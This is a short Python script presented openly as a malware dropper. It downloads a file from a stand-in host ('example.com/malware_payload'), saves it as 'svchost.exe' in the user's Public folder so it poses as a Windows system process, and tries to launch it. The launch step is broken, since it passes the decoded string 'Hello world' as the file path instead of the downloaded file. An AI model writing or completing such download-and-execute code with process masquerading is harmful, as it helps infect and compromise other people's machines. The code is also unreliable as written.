import os
import sys
import base64
from urllib.request import urlopen

def deobfuscate_payload(encoded_payload):
    return base64.b64decode(encoded_payload).decode()

def download_file(url, destination):
    with urlopen(url) as response:
        data = response.read()
    with open(destination, 'wb') as f:
        f.write(data)

def save_to_system_folder(file_path, payload_url):
    payload_name = "svchost.exe"
    system_folder = os.path.join(os.environ['USERPROFILE'], 'Public')
    if not os.path.exists(system_folder):
        os.makedirs(system_folder)
    local_file = os.path.join(system_folder, payload_name)
    download_file(payload_url, local_file)

def launch_payload(file_path):
    import subprocess
    try:
        subprocess.Popen([file_path])
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sys.exit()

if __name__ == "__main__":
    obfuscated_payload = "SGVsbG8gd29ybGQ="  # Hello world in base64
    payload_url = "https://example.com/malware_payload"

    deobf_payload = deobfuscate_payload(obfuscated_payload)
    save_to_system_folder(deobf_payload, payload_url)
    launch_payload(deobf_payload)
